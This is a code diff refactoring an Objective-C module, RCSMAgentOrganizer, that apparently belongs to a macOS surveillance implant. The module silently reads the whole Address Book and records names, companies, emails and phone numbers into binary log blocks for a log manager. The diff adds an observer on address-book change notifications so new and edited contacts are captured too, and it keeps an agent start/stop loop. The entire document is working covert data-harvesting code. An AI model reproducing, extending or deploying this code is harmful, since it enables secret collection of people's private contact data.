@@ -24,9 +24,9 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (void)_grabAllContacts;
 
 //
-// Grab a single contact - observer for kABDatabaseChangedExternallyNotification
+// Callback for ABDatabaseChangedNotification
 //
-- (void)_grabSingleContact: (NSNotification *)aNotification;
+- (void)_ABChangedCallback: (NSNotification *)aNotification;
 
 //
 // Serialize the object for logging
@@ -34,8 +34,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (NSData *)_prepareContactForLogging: (ABRecord *)aRecord;
 
 - (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
-                              withType: (int32_t)aType
-                               outSize: (int32_t *)outSize;
+                              withType: (int32_t)aType;
 
 //
 // Write down the log data
@@ -49,8 +48,10 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 - (void)_grabAllContacts
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"");
+  verboseLog(@"");
 #endif
   
   ABAddressBook *addressBook = [ABAddressBook sharedAddressBook];
@@ -58,129 +59,177 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   
   NSMutableData *logData = [NSMutableData new];
   
+#ifdef DEBUG_ORGANIZER
+  infoLog(@"Found %d entries", [allPeople count]);
+#endif
+  
   for (ABRecord *record in allPeople)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      NSMutableData *logHeader      = [[NSMutableData alloc]
+                                       initWithLength: sizeof(organizerAdditionalHeader)];
+      organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
       
       NSData *contactLog = [self _prepareContactForLogging: record];
-      [logData appendData: contactLog];
-      [contactLog release];
+      [contactLog retain];
       
+      u_int blockSize = sizeof(organizerAdditionalHeader)
+                        + [contactLog length];
+      
+      additionalHeader->size        = blockSize;
+      additionalHeader->version     = CONTACT_LOG_VERSION;
+      additionalHeader->identifier  = 0;
+      
+      [logData appendData: logHeader];
+      [logData appendData: contactLog];
+      
+      [contactLog release];
       [innerPool release];
     }
   
   [self _logData: logData];
   [logData release];
+  [outerPool release];
 }
 
-- (void)_grabSingleContact: (NSNotification *)aNotification
+- (void)_ABChangedCallback: (NSNotification *)aNotification
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+#ifdef DEBUG_ORGANIZER
+  verboseLog(@"userInfo dict: %@", [aNotification userInfo]);
+#endif
+  
+  int i = 0;
+  
+  // Check first for inserted records
+  NSArray *entries = [[aNotification userInfo] objectForKey: kABInsertedRecords];
+  
+  if (entries == nil)
+    {
+#ifdef DEBUG_ORGANIZER
+      warnLog(@"No new record");
+#endif
+      
+      // Check for updated records
+      entries = [[aNotification userInfo] objectForKey: kABUpdatedRecords];
+    }
+  if (entries == nil)
+    {
+#ifdef DEBUG_ORGANIZER
+      warnLog(@"No updated record, returning");
+#endif
+      // We return from here since we're not interested in records deletion
+      [outerPool release];
+      return;
+    }
+  
+  ABAddressBook *addressBook = [ABAddressBook addressBook];
+  
+  for (i = 0; i < [entries count]; i++)
+    {
+      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      
+      NSString *uniqueID = [entries objectAtIndex: i];
+      
+#ifdef DEBUG_ORGANIZER
+      verboseLog(@"uniqueID: %@", uniqueID);
+#endif
+      
+      ABRecord *record = [addressBook recordForUniqueId: uniqueID];
+      
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"record: %@", record);
+#endif
+      
+      NSMutableData *logData        = [NSMutableData new];
+      NSMutableData *logHeader      = [[NSMutableData alloc]
+                                       initWithLength: sizeof(organizerAdditionalHeader)];
+      organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
+      
+      NSData *contactLog = [self _prepareContactForLogging: record];
+      [contactLog retain];
+      
+      u_int blockSize = sizeof(organizerAdditionalHeader)
+                        + [contactLog length];
+      
+      additionalHeader->size        = blockSize;
+      additionalHeader->version     = CONTACT_LOG_VERSION;
+      additionalHeader->identifier  = 0;
+      
+      [logData appendData: logHeader];
+      [logData appendData: contactLog];
+      
+      [self _logData: logData];
+      
+      [contactLog release];
+      [logHeader release];
+      [logData release];
+      
+      [innerPool release];
+    }
+  
+  [outerPool release];
 }
 
 - (NSData *)_prepareContactForLogging: (ABRecord *)aRecord
 {
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"");
+  verboseLog(@"");
 #endif
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  NSMutableData *logHeader = [[NSMutableData alloc]
-                              initWithLength: sizeof(organizerAdditionalHeader)];
-  NSMutableData *contactLog = [NSMutableData new];
-  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
+  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
+  NSMutableData *contactLog     = [NSMutableData new];
   
   // First Name
   if ([aRecord valueForProperty: kABFirstNameProperty])
     {
-      NSString *firstNameValue = [aRecord valueForProperty: kABFirstNameProperty];
-      NSData *recordData = [firstNameValue dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-      int32_t blockSize = 0;
-      
-      NSData *serializedData = [self _serializeSingleRecordData: recordData
-                                                       withType: FirstName
-                                                        outSize: &blockSize];
-      [serializedData retain];
+      NSString *element   = [aRecord valueForProperty: kABFirstNameProperty];
+      NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
       
 #ifdef DEBUG_ORGANIZER
-      infoLog(@"blockSize: %d", blockSize);
+      infoLog(@"FirstName: %@", element);
 #endif
-      
-      additionalHeader->size        = blockSize;
-      additionalHeader->version     = CONTACT_LOG_VERSION;
-      additionalHeader->identifier  = 0;
-    
-      // Generate the log NSData within the header
-      [contactLog appendData: logHeader];
+
+      NSData *serializedData = [self _serializeSingleRecordData: recordData
+                                                       withType: FirstName];
+      [serializedData retain];
       [contactLog appendData: serializedData];
-                            
       [serializedData release];
     }
   
   // Last Name
   if ([aRecord valueForProperty: kABLastNameProperty])
     {
-      u_int elemSize = [[aRecord valueForProperty: kABLastNameProperty]
-                        lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-      NSMutableData *singleElement = [NSMutableData new];
+      NSString *element   = [aRecord valueForProperty: kABLastNameProperty];
+      NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"LastName: %@", element);
+#endif
       
-      //
-      // This should be tag-1b -- len-3b (1dword)
-      //
-      u_int tag = LastName << 24;
-      tag |= elemSize;
-      
-      u_int blockSize = sizeof(organizerAdditionalHeader)
-                        + sizeof(u_int)
-                        + elemSize;
-      
-      additionalHeader->size        = blockSize;
-      additionalHeader->version     = CONTACT_LOG_VERSION;
-      additionalHeader->identifier  = 0;
-      
-      [singleElement appendBytes: &tag
-                          length: sizeof(u_int)];
-      [singleElement appendData: [[aRecord valueForProperty: kABLastNameProperty]
-                                  dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-      
-      // Generate the log NSData within the header
-      [contactLog appendData: logHeader];
-      [contactLog appendData: singleElement];
-      
-      [singleElement release];
+      NSData *serializedData = [self _serializeSingleRecordData: recordData
+                                                       withType: LastName];
+      [serializedData retain];
+      [contactLog appendData: serializedData];
+      [serializedData release];
     }
   
   // Company Name
   if ([aRecord valueForProperty: kABOrganizationProperty])
     {
-      u_int elemSize = [[aRecord valueForProperty: kABOrganizationProperty]
-                        lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-      NSMutableData *singleElement = [NSMutableData new];
+      NSString *element   = [aRecord valueForProperty: kABOrganizationProperty];
+      NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
       
-      //
-      // This should be tag-1b -- len-3b (1dword)
-      //
-      u_int tag = CompanyName << 24;
-      tag |= elemSize;
-      
-      u_int blockSize = sizeof(organizerAdditionalHeader)
-                        + sizeof(u_int)
-                        + elemSize;
-      
-      additionalHeader->size        = blockSize;
-      additionalHeader->version     = CONTACT_LOG_VERSION;
-      additionalHeader->identifier  = 0;
-      
-      [singleElement appendBytes: &tag
-                          length: sizeof(u_int)];
-      [singleElement appendData: [[aRecord valueForProperty: kABOrganizationProperty]
-                                  dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-      
-      // Generate the log NSData within the header
-      [contactLog appendData: logHeader];
-      [contactLog appendData: singleElement];
-      
-      [singleElement release];
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"CompanyName: %@", element);
+#endif
+
+      NSData *serializedData = [self _serializeSingleRecordData: recordData
+                                                       withType: CompanyName];
+      [serializedData retain];
+      [contactLog appendData: serializedData];
+      [serializedData release];
     }
   
   // Email Address
@@ -190,287 +239,124 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
       ABMultiValue *email = [aRecord valueForProperty: kABEmailProperty];
       int i = 0;
       
-      //
-      // Grab at max 3 email addresses
-      //
-      if ([email count] <= 3)
+      for (i = 0; i < [email count]; i++)
         {
-          for (; i < [email count]; i++)
+          //
+          // Grab at max 3 email addresses
+          //
+          if (i == 3)
             {
-              u_int elemSize = [[email valueAtIndex: i]
-                                lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-              NSMutableData *singleElement = [NSMutableData new];
-              
-              //
-              // This should be [tag-1b -- len-3b] (1 dword)
-              //
-              u_int tag = 0;
-              
-              switch (i)
-                {
-                case 0:
-                  tag = Email1Address << 24;
-                  break;
-                case 1:
-                  tag = Email2Address << 24;
-                  break;
-                case 2:
-                  tag = Email3Address << 24;
-                  break;
-                }
-              
-              tag |= elemSize;
-              
-              u_int blockSize = sizeof(organizerAdditionalHeader)
-                                + sizeof(u_int)
-                                + elemSize;
-              
-              additionalHeader->size        = blockSize;
-              additionalHeader->version     = CONTACT_LOG_VERSION;
-              additionalHeader->identifier  = 0;
-              
-              [singleElement appendBytes: &tag
-                                  length: sizeof(u_int)];
-              [singleElement appendData: [[email valueAtIndex: i]
-                                          dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-              
-              // Generate the log NSData within the header
-              [contactLog appendData: logHeader];
-              [contactLog appendData: singleElement];
-              
-              [singleElement release];
+#ifdef DEBUG_ORGANIZER
+              warnLog(@"Won't log anymore emails");
+#endif
+              break;
             }
-        }
-      else // Grab at least one
-        {
-          u_int elemSize = [[email valueAtIndex: 0]
-                            lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-          NSMutableData *singleElement = [NSMutableData new];
           
-          //
-          // This should be [tag-1b -- len-3b] (1 dword)
-          //
-          u_int tag = 0;
+          NSString *element       = [email valueAtIndex: i];
+          NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+          uint32_t type           = 0;
+
+#ifdef DEBUG_ORGANIZER
+          infoLog(@"EmailAddress: %@", element);
+#endif
           
-          tag = Email1Address << 24;
-          tag |= elemSize;
-          
-          u_int blockSize = sizeof(organizerAdditionalHeader)
-                            + sizeof(u_int)
-                            + elemSize;
-          
-          additionalHeader->size        = blockSize;
-          additionalHeader->version     = CONTACT_LOG_VERSION;
-          additionalHeader->identifier  = 0;
-          
-          [singleElement appendBytes: &tag
-                              length: sizeof(u_int)];
-          [singleElement appendData: [[email valueAtIndex: 0]
-                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-          
-          // Generate the log NSData within the header
-          [contactLog appendData: logHeader];
-          [contactLog appendData: singleElement];
-          
-          [singleElement release];
+          switch (i)
+            {
+            case 0:
+              type = Email1Address;
+              break;
+            case 1:
+              type = Email2Address;
+              break;
+            case 2:
+              type = Email3Address;
+              break;
+            }
+           
+          NSData *serializedData  = [self _serializeSingleRecordData: recordData
+                                                            withType: type];
+          [serializedData retain];
+          [contactLog appendData: serializedData];
+          [serializedData release];
         }
     }
   
   // Phone
   // MultiValue
-  if ([aRecord valueForProperty: kABEmailProperty])
+  if ([aRecord valueForProperty: kABPhoneProperty])
     {
       ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
       int i = 0;
       
-      //
-      // Grab at max 3 phone numbers
-      //
-      if ([phone count] <= 3)
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"phone entries: %d", [phone count]);
+#endif
+      for (i = 0; i < [phone count]; i++)
         {
-          for (; i < [phone count]; i++)
+          //
+          // Grab at max 3 email addresses
+          //
+          if (i == 3)
             {
-              u_int elemSize = [[phone valueAtIndex: i]
-                                lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-              NSMutableData *singleElement = [NSMutableData new];
-              
-              //
-              // This should be [tag-1b -- len-3b] (1 dword)
-              //
-              u_int tag = 0;
-              
-              if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
-                {
-                  tag = MobileTelephoneNumber << 24;
-                }
-              else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
-                {
-                  tag = BusinessTelephoneNumber << 24;
-                }
-              else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
-                {
-                  tag = HomeTelephoneNumber << 24;
-                }
-              
-              tag |= elemSize;
-              
-              u_int blockSize = sizeof(organizerAdditionalHeader)
-                                + sizeof(u_int)
-                                + elemSize;
-              
-              additionalHeader->size        = blockSize;
-              additionalHeader->version     = CONTACT_LOG_VERSION;
-              additionalHeader->identifier  = 0;
-              
-              [singleElement appendBytes: &tag
-                                  length: sizeof(u_int)];
-              [singleElement appendData: [[phone valueAtIndex: i]
-                                          dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-              
-              // Generate the log NSData within the header
-              [contactLog appendData: logHeader];
-              [contactLog appendData: singleElement];
-              
-              [singleElement release];
+#ifdef DEBUG_ORGANIZER
+              warnLog(@"Won't log anymore phone numbers");
+#endif
+              break;
             }
-        }
-      else // Grab at least one
-        {
-          u_int elemSize = [[phone valueAtIndex: 0]
-                            lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-          NSMutableData *singleElement = [NSMutableData new];
           
-          //
-          // This should be [tag-1b -- len-3b] (1 dword)
-          //
-          u_int tag = 0;
-          
-          tag = MobileTelephoneNumber << 24;
-          tag |= elemSize;
-          
-          u_int blockSize = sizeof(organizerAdditionalHeader)
-                            + sizeof(u_int)
-                            + elemSize;
-          
-          additionalHeader->size        = blockSize;
-          additionalHeader->version     = CONTACT_LOG_VERSION;
-          additionalHeader->identifier  = 0;
-          
-          [singleElement appendBytes: &tag
-                              length: sizeof(u_int)];
-          [singleElement appendData: [[phone valueAtIndex: 0]
-                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-          
-          // Generate the log NSData within the header
-          [contactLog appendData: logHeader];
-          [contactLog appendData: singleElement];
-          
-          [singleElement release];
-        }
-    }
-  
-  // Phone
-  // MultiValue
-  if ([aRecord valueForProperty: kABEmailProperty])
-    {
-      ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
-      int i = 0;
-      
-      //
-      // Grab at max 3 phone numbers
-      //
-      if ([phone count] <= 3)
-        {
-        for (; i < [phone count]; i++)
-          {
-          u_int elemSize = [[phone valueAtIndex: i]
-                            lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-          NSMutableData *singleElement = [NSMutableData new];
-          
-          //
-          // This should be [tag-1b -- len-3b] (1 dword)
-          //
-          u_int tag = 0;
+          NSString *element       = [phone valueAtIndex: i];
+          NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+          uint32_t type           = 0;
+
+#ifdef DEBUG_ORGANIZER
+          infoLog(@"Phone: %@", element);
+#endif
           
           if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
             {
-            tag = MobileTelephoneNumber << 24;
+#ifdef DEBUG_ORGANIZER
+              infoLog(@"is Mobile");
+#endif
+              type = MobileTelephoneNumber;
             }
           else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
             {
-            tag = BusinessTelephoneNumber << 24;
+#ifdef DEBUG_ORGANIZER
+              infoLog(@"is Business");
+#endif
+              type = BusinessTelephoneNumber;
             }
           else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
             {
-            tag = HomeTelephoneNumber << 24;
+#ifdef DEBUG_ORGANIZER
+              infoLog(@"is Home");
+#endif
+              type = HomeTelephoneNumber;
+            }
+          else
+            {
+#ifdef DEBUG_ORGANIZER
+              infoLog(@"Forcing to HomePhone for (%@)", [phone labelAtIndex: i]);
+#endif
+              // Forcing home telephone number just in case
+              type = HomeTelephoneNumber;
             }
           
-          tag |= elemSize;
-          
-          u_int blockSize = sizeof(organizerAdditionalHeader)
-          + sizeof(u_int)
-          + elemSize;
-          
-          additionalHeader->size        = blockSize;
-          additionalHeader->version     = CONTACT_LOG_VERSION;
-          additionalHeader->identifier  = 0;
-          
-          [singleElement appendBytes: &tag
-                              length: sizeof(u_int)];
-          [singleElement appendData: [[phone valueAtIndex: i]
-                                      dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-          
-          // Generate the log NSData within the header
-          [contactLog appendData: logHeader];
-          [contactLog appendData: singleElement];
-          
-          [singleElement release];
+          NSData *serializedData  = [self _serializeSingleRecordData: recordData
+                                                            withType: type];
+          [serializedData retain];
+          [contactLog appendData: serializedData];
+          [serializedData release];
         }
-      }
-    else // Grab at least one
-      {
-      u_int elemSize = [[phone valueAtIndex: 0]
-                        lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
-      NSMutableData *singleElement = [NSMutableData new];
-      
-      //
-      // This should be [tag-1b -- len-3b] (1 dword)
-      //
-      u_int tag = 0;
-      
-      tag = MobileTelephoneNumber << 24;
-      tag |= elemSize;
-      
-      u_int blockSize = sizeof(organizerAdditionalHeader)
-      + sizeof(u_int)
-      + elemSize;
-      
-      additionalHeader->size        = blockSize;
-      additionalHeader->version     = CONTACT_LOG_VERSION;
-      additionalHeader->identifier  = 0;
-      
-      [singleElement appendBytes: &tag
-                          length: sizeof(u_int)];
-      [singleElement appendData: [[phone valueAtIndex: 0]
-                                  dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-      
-      // Generate the log NSData within the header
-      [contactLog appendData: logHeader];
-      [contactLog appendData: singleElement];
-      
-      [singleElement release];
-      }
     }
   
-  [logHeader release];
   [outerPool release];
   
-  return contactLog;
+  return [contactLog autorelease];
 }
 
 - (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                               withType: (int32_t)aType
-                               outSize: (int32_t *)outSize
 {
   u_int elemSize = [aRecordData length];
   NSMutableData *singleElement = [NSMutableData new];
@@ -481,23 +367,17 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   u_int tag = aType << 24;
   tag |= elemSize;
   
-  u_int blockSize = sizeof(organizerAdditionalHeader)
-                    + sizeof(u_int)
-                    + elemSize;
-  
-  *outSize = blockSize;
-  
   [singleElement appendBytes: &tag
                       length: sizeof(u_int)];
   [singleElement appendData: aRecordData];
   
-  return singleElement;
+  return [singleElement autorelease];
 }
 
 - (BOOL)_logData: (NSMutableData *)aLogData
 {
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"");
+  verboseLog(@"");
 #endif
   
   RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
@@ -609,7 +489,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
+  
 #ifdef DEBUG_ORGANIZER
   infoLog(@"Agent organizer started");
   infoLog(@"AgentConf: %@", mConfiguration);
@@ -619,29 +499,28 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
                      forKey: @"status"];
   
   //
+  // Register our observer in order to grab notifications about changes
+  // NOTE: kABDatabaseChangedExternallyNotification on NSNotificationCenter
+  // doesn't seem to work
+  //
+  // On Distributed Notification Center
+  // - @"ABDatabaseChangedNotification"
+  // - @"ABDatabaseChangedNotificationPriv" (sent always two times)
+  //
+  [[NSDistributedNotificationCenter defaultCenter] addObserver: self
+                                                      selector: @selector(_ABChangedCallback:)
+                                                          name: @"ABDatabaseChangedNotification"
+                                                        object: nil];
+  
+  //
   // First off, grab all contacts
+  // Without THIS here it grabs only the first modication (better than nothing anyways)
   //
   [self _grabAllContacts];
   
-  //
-  // Now register our observer in order to grab notifications about changes
-  //
-  /*[[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self
-                                                         selector: @selector(_grabSingleContact:)
-                                                             name: kABDatabaseChangedExternallyNotification 
-                                                           object: nil];
-  */
   while ([mConfiguration objectForKey: @"status"]    != AGENT_STOP
          && [mConfiguration objectForKey: @"status"] != AGENT_STOPPED)
     {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-      // File sequenziale
-      // per default all'inizio prende tutto e poi logga ogni qualvolta un nuovo
-      // contatto viene aggiunto oppure ogni n secs in assenza di un meccanismo
-      // di notifica
-      
-      [innerPool release];
       sleep(1);
     }
   
@@ -661,8 +540,9 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (BOOL)stop
 {
 #ifdef DEBUG_ORGANIZER
-  warnLog(@"");
+  verboseLog(@"");
 #endif
+  
   int internalCounter = 0;
   
   [mConfiguration setObject: AGENT_STOP
